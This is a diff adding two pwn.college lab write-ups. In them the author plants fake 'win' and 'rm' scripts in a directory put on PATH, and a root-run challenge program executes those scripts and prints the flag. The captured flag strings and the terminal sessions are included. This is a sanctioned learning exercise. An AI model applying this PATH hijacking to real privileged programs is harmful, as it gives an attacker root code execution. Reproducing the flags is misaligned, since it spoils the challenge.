@@ -90,3 +90,77 @@ hacker@path~finding-commands:~$
 * Once you have the full path to an executable, you can inspect other files in the same directory (for example, a `flag` file) by using that path.
 
 ---
+# 🔹 Adding Commands
+
+In this challenge you must create a `win` command in a directory on your `$PATH` so that `/challenge/run` (which runs as root) calls it. Because `/challenge/run` will search `PATH` for `win`, place your script in a directory and set `PATH` so that `win` is found. Use a shell builtin (`read`) to avoid needing `/bin/cat` when you overwrite `PATH`.
+
+### 🏴 Flag
+
+`pwn.college{Ahk3qsStoNr5xv7Zm46b2LDxaxB.QX2cjM1wCO0gjNzEzW}`
+
+### ⚡ How I Solved
+
+* Created a directory for custom commands: `mkdir /tmp/mybin`.
+* Wrote a small `win` script that uses the bash `read` builtin to read `/flag` and print it.
+* Made the script executable with `chmod +x /tmp/mybin/win`.
+* Exported `PATH` to point to the new directory so `/challenge/run` would find `win`.
+* Ran `/challenge/run` which invoked `win` and printed the flag.
+
+```
+hacker@path~adding-commands:~$ mkdir /tmp/mybin
+hacker@path~adding-commands:~$ cat > /tmp/mybin/win <<'EOF'
+#!/bin/bash
+read -r FLAG < /flag
+printf '%s\n' "$FLAG"
+EOF
+hacker@path~adding-commands:~$ chmod +x /tmp/mybin/win
+hacker@path~adding-commands:~$ export PATH=/tmp/mybin
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{Ahk3qsStoNr5xv7Zm46b2LDxaxB.QX2cjM1wCO0gjNzEzW}
+hacker@path~adding-commands:~$
+```
+
+### 📚 What I Learned
+
+* You can inject custom commands by creating a directory with executables and placing it in `PATH`.
+* Overwriting `PATH` can hide standard utilities; use absolute paths or shell builtins (like `read`) to avoid losing functionality.
+* `/challenge/run` executed `win` as root; by providing `win` we can control what it does (in this case, print the flag).
+
+---
+# 🔹 Hijacking Commands
+
+In this challenge the program attempts to delete `/flag` using `rm`. Because the shell looks for `rm` in the directories listed in `$PATH`, you can provide your own `rm` that instead prints the flag. Place your fake `rm` in a directory and run `/challenge/run` with `PATH` set so your `rm` is found first.
+
+### 🏴 Flag
+
+`pwn.college{sNYTtpe75KJ1BiHrfRGHtQKyJhr.QX3cjM1wCO0gjNzEzW}`
+
+### ⚡ How I Solved
+
+* Created a directory for custom commands: `mkdir -p /tmp/mybin`.
+* Wrote a small `rm` script that reads `/flag` using the `read` builtin and prints it.
+* Made the script executable with `chmod +x /tmp/mybin/rm`.
+* Ran `/challenge/run` with `PATH` set so that `/tmp/mybin` is searched first.
+
+```
+hacker@path~hijacking-commands:~$ mkdir -p /tmp/mybin
+hacker@path~hijacking-commands:~$ cat > /tmp/mybin/rm <<'EOF'
+#!/bin/bash
+read -r FLAG < /flag
+printf '%s\n' "$FLAG"
+EOF
+hacker@path~hijacking-commands:~$ chmod +x /tmp/mybin/rm
+hacker@path~hijacking-commands:~$ PATH=/tmp/mybin /challenge/run
+Trying to remove /flag...
+pwn.college{sNYTtpe75KJ1BiHrfRGHtQKyJhr.QX3cjM1wCO0gjNzEzW}
+hacker@path~hijacking-commands:~$
+```
+
+### 📚 What I Learned
+
+* You can hijack system utilities by placing executables with the same name earlier in `$PATH`.
+* Overwriting `PATH` can hide standard utilities; use builtins or absolute paths if needed.
+* When a privileged program invokes a command by name, controlling `PATH` can let you control what that program runs.
+
+---
